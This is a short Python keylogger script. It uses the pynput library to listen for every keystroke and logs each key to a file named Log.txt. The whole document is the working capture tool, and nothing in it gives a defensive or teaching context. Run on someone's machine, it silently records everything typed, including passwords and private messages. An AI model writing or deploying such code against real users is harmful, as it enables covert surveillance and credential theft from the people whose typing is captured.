from pynput.keyboard import Listener
import logging


log_dir = ""

logging.basicConfig(filename=(log_dir + "Log.txt"), level=logging.DEBUG, format='%(message)s')  # %(asctime)s: 


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
